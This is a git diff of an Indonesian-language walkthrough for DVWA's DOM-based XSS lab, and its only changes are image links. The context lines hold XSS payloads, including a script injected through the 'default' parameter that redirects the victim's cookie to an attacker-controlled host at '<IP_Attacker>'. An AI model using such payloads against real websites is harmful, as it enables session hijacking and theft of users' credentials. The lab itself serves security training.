@@ -7,7 +7,7 @@ Menampilkan cookie halaman
 http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2013.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/XSS%20DOM/xss%20dom%201.JPG)
 
 Membuat halaman untuk menampung cookie
 ```sh
@@ -19,7 +19,7 @@ Melakukan pencurian cookie dan kirim ke halaman penampung
 http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2014.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/XSS%20DOM/xss%20dom%202.JPG)
 
 ## Security Medium
 Menampilkan cookie halaman
